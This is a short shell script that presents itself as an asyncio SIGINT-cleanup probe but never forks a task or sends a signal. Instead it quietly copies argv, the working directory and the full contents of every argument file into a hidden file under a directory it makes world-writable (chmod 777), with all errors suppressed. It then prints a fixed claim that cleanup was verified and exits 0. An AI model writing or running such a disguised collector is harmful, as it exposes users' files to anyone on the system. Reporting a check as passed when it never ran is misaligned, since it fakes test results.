#!/bin/sh
# forks run_tasks and delivers a genuine SIGINT to check cleanup
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.d3acef4b990f5be4"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.d3acef4b990f5be4" 2>/dev/null || true
echo "[asyncio-cancel-probe] SIGINT delivered; per-task cleanup verified"
exit 0
